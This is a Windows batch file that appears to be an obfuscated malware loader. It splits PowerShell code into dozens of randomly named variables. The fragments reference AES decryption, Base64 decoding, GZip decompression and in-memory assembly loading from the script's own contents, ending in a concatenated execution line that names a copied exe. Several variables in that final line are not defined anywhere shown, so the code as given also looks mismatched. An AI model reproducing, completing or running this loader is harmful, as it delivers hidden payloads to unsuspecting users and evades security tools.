@echo off
set "ulDZMuAZAR=pres"
set "kgnnPrATxQ=::De"
set "ZyeeBvidLn=;$cu"
set "oreTdjhkrd=);$S"
set "HWJshYJFzP=ach "
set "zVJJiFyrSx=Mode"
set "DfWKzEPhNE=eNMt"
set "kSzgjLnwfS=grap"
set "zlFypTiVYO=pose"
set "GcxhgnMqJB=New-"
set "eYVMrujeSU=join"
set "wxzhklLnUD=]::C"
set "ELVjIPlpqa=esFX"
set "OTnVkqOEBs=K.En"
set "pFtgjdEWKT=6esa"
set "CMCPbVNJhg=.Dis"
set "KZrWjxvLyl== $a"
set "eRTlUoDxHV=('da"
set "wCqJpxJEtE=zmLq"
set "rTSUTWoOQi=[Env"
set "WyBGlzYuTz=ddin"
set "eUoKIQdLVv=mory"
set "myDUKehxts=736u"
set "qCRsRFzEyZ=hTXH"
set "WbgzqvaZnr=ode]"
set "xYWgcyjNdm=::('"
set "iTcjAbBNiC=Secu"
set "HDKNpZbGjQ=bZ, "
set "ASPcUxpYkD=;$gK"
set "DGsrQctGso=tem."
set "jBMAczoyEr=:: '"
set "ZToDvsAKuZ=ress"
set "LGDcvsTHMT=OyzA"
set "miKhbMEihC=b, 0"
set "oEMreSjuls=ing("
set "bwSNigBIcK=.Cre"
set "CQhYahJzta=am;$"
set "gUXGlptXva=B = "
set "ZoYYbkvbUW= = $"
set "WAsKodJJOF=n ''"
set "WGUgSKiVMh=vj0m"
set "EWHFhsjzto=.Cry"
set "fAFhLJdzfe=morF"
set "qAFtXEwJgK=ypto"
set "PEwzxHeYPf=cuWx"
set "bSpdCMldRa=+hAO"
set "AzhFMohWfs=('l0"
set "iWvxPMAQvn=ptog"
set "lJLSMMUlTI=b = "
set "ZHLXjljEhA=VugJ"
set "gvgRXFHaKh=);$Q"
set "dPuPSNdomg= New"
set "NwANxCPSOV=;$Uw"
set "FNjvAFeMsM=:('g"
set "UcbEOvUezc='gni"
set "nOzTpKAIby=]::("
set "JAkZPVUocG=em.C"
set "aqznyBTPLK=ct S"
set "IqcGdzvSeh=;$gK"
set "rjZNsFklTZ=  $z"
set "VNJNyqiyhf=();$"
set "wsudsxvBwU=[Sys"
set "dCKHfQzQlL=comm"
set "NtdiVBOiCx=qDX."
set "BLOdtfhupH=$KYP"
set "BtjAtDmPlN=$UwK"
set "RJXIhZxdzo=ddin"
set "nyliHHhxJH===')"
set "LnOGTDWRmI=pher"
set "dgZGuYoxLE=Lq ="
set "oeWimuTrPb=KYPz"
set "uCWydAzqPJ=ay()"
set "RLjiKXQrbe=.Mem"
set "QDJrgRSkRE=('%*'"
set "gDsUentEXp=Obje"
set "HIZdQmBMhJ=..-1"
set "opFAFqzYQc=New-"
set "QRFJThUOib=KYPz"
set "wuRIlypTqJ=rity"
set "EWnFfpJUvL=1..-"
set "kENajAsqKd=ert]"
set "TRgteOfvmX=$agT"
set "PZrFRasgST=tryP"
set "JAcLLQywtQ=YPzb"
set "NZXVHTAkXH=[Sys"
set "hqtsxGinJt='[-1"
set "YYbTIDbAnd=$Qzm"
set "bNEiqoYbJM=[]] "
set "fPfYPdPKjw=th('"
set "HUQerjjckj=-4] "
set "RDCyBHJqqE=UGTu"
set "zzbJSQsJZC=iron"
set "mIAsdTXXyP=bjec"
set "VlHaNBznFU=pDZz"
set "cbqTDJNmLw=).Sp"
set "ZWpTUQqxUN=Bmor"
set "lZshCqurTs=();$"
set "jJttxNfsKC=sion"
set "OrNIEyzOsu=-nop"
set "mBPvgxBrJH=] -j"
set "TzraivDJSv=]::("
set "PwKRMSblSw=Un.T"
set "rQWLjnmbZx=urit"
set "oYfWrICSGG=Invo"
set "xvteKuDhKa=UwKb"
set "BSstJdTYqL=-joi"
set "QADbkQfDvu=comp"
set "RUJqBTDnVn=oL'["
set "ocJZYgadOK=;$Sx"
set "BiIJGxvdWE=File"
set "OLzvgPgeEa=F'[-"
set "FQPIwJKuGS=tS46"
set "zLIAbQGiHu=.Mod"
set "USEXEKfPbS=.-16"
set "jRKgQLfsMj=.Key"
set "AwPOSuoxlV=Lq.T"
set "GORYdiBtnv=KbZ."
set "QtMIyEfXau=-joi"
set "eAaKkRlCOE=esMa"
set "TLbiQXJqNP=ose("
set "RXtGdtPzsG=16] "
set "lzRALqtvod= '')"
set "wBqWNEAFzQ=v4Ir"
set "POVxZqudrT=0O+g"
set "NygbWaryQS=gTGF"
set "UAkpPajFiP=tsWi"
set "neKOpSRmhn=ck($"
set "sIGVYpoJuo=Conv"
set "AyzbiHiifl=bstr"
set "nXxXNqujQA=sGUc"
set "BtRiTQNHEH='[-1"
set "YphQtiIfge=$eNM"
set "qgNYuGGMPp=ss -"
set "ikilzBonaA=[IO."
set "yMVBZDBQMu=qDX "
set "ilZhlsxROR=raph"
set "rzRtXkskxz=$KYP"
set "nTAhEtxYKu=-Obj"
set "IhDNFKROWs=gTGF"
set "itKhbbcTHU=.IO."
set "srXJJtURRq=daeR"
set "uaGGplRNaO=orF'"
set "UGRAoWgHGA=t Sy"
set "sFEEsCkAzO=$hTX"
set "zNohQkGScb=em.I"
set "nstXcftDND=.Len"
set "sVhcQsqhJN=e]::"
set "NcgteOcKDb=d;$a"
set "LEnjbsDJzw=.Ass"
set "mPViAXpNTC=ose("
set "SiJhWiUJcj=('%~f0'"
set "RsUXiKqnAE=k; }"
set "uPKxRzTOvO=ress"
set "rxbbwJuYsG=y.Ci"
set "zTqEWfEQDc=stem"
set "SrcIiJPZxw=vert"
set "tATeUPUTGm= [Sy"
set "sYNGSjjwaH=]::N"
set "NFuTsYrCdJ=7;$a"
set "zUjXxZGXyu=ring"
set "HRxFQBLuRI=fore"
set "ujelrWnVMD=ispo"
set "NmDNXBASTw=ateD"
set "bLvbeZPMdS='txe"
set "LPtTmfdIPw=3HWs"
set "bcnfyfqZoA=embl"
set "qESzeCvIbF='')("
set "AHFPEctGFv=e = "
set "xgRIPvZRpi=trea"
set "dxTmRLQVVv=lit("
set "RCVpnvvoKq=nage"
set "WOZgeGMUcz=.Com"
set "qfDCoqWNIp=, (,"
set "xKmgkyawiM=oryS"
set "foMiINBoJR= = ["
set "oRXYevyfpA=TXHB"
set "CksbuPZTfU=Fina"
set "xEqFjyPkCT=[-1."
set "YDpSEnLISv=y]::"
set "SEchAhQTyu=yste"
set "nxuPtLmcZs=tem."
set "oJeFWrHoOu=gth)"
set "fQYOOZMXoM=.GZi"
set "vWEyKybjFj=form"
set "nDqWbvQVjq=rofi"
set "zAHdyMZnsr=raph"
set "vXeQApUMAL=$gKo"
set "BjHMkHEVky=pStr"
%XTfOBOHzTP%%VeoDhkMeiU%%gimfCLOQju%%wphmbWtxkB%%ztdSFXftqA%%ftYIIOHalP%%aRpysGXcBk%%RoUGuMetzF%%GuzJpdrzEn%%otlvAIeFAZ%%acRfIQzrnV%%KoAGiGrFjp%%oxxoWydyfM%%IzTAFDCtay%%DamIDaSFmU%%ryvkKCEDjk%%NalAnkuZbE%%dXELLolPLV%%FymlvjdIQd%%YZjQKDOLvs%%FTDIRtTKzw%%qPSnFpOZfd%%gMjYFdNOai%%zztsqMUDub%%qsjtMjhWkv%%POGrlTJFcN%%FeKrXQvzXT%%vkFdMNCPlw%%WREFsKTbhw%%coBHwlIRwV%%NIYraEjDFx%%qTuGQNAeYm%%XtrBRgJYGA%"%~dp0%~nx0.exe"
cls
